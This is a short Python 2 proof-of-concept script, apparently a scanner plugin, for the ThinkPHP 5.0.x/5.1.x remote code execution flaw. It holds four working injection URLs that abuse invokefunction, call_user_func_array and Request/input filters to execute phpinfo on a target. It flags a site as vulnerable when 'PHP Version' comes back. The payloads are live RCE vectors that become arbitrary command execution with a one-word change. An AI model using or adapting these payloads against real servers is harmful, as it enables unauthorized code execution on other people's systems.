#coding=utf8
import urllib2


class Poc(object):

	def __init__(self, domain):
		self.domain = domain
		self.data = {
					"file_name" : __name__,
					"name" : "ThinkPHP V5.0.X < 5.0.23,V5.1.X <= 5.1.31 远程代码执行漏洞",
					"referer" : "https://bbs.ichunqiu.com/thread-48687-1-1.html",
		}

	def _poc(self):
		payloads = [
				   "/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
				   "/index.php?s=index/\\think\\Request/input&filter=phpinfo&data=1",
				   "/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
				   "/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
		]
		for payload in payloads:
			url1 = self.domain + payload
			url2 = self.domain + "/public" + payload
			res = None
			try:
				res = urllib2.urlopen(url1, timeout=3)
			except:
				pass
			try:
				res = urllib2.urlopen(url2, timeout=3)
			except:
				pass
			if res and "PHP Version" in res.read():
				return True
			else:
				pass
		return False


	def run(self):
		check = self._poc()
		if check:
			return self.data
		else:
			return False




if __name__ == "__main__":
	test = Poc("http://127.0.0.1:8081/tp5131")
	data = test.run()
	print data